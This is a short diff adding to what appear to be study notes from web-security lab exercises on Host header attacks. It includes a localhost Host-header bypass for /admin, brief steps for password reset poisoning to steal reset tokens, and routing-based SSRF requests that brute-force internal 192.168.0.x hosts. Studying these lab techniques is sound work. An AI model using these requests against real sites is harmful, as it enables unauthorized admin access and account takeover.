@@ -8,3 +8,17 @@ Host header authentication bypass
 GET /admin
 Host: localhost
 
+Password Reset poisoning
+> change host header
+> still able to issue password reset
+> host header gets reflected in email
+> steal token
+
+# Accessing admin panel via routing-based ssrf
+GET /admin HTTP/1.1
+Host: 192.168.0.§0§
+
+> alternative method
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: BURP-COLLABORATOR-SUBDOMAIN then  192.168.0.§0§
+
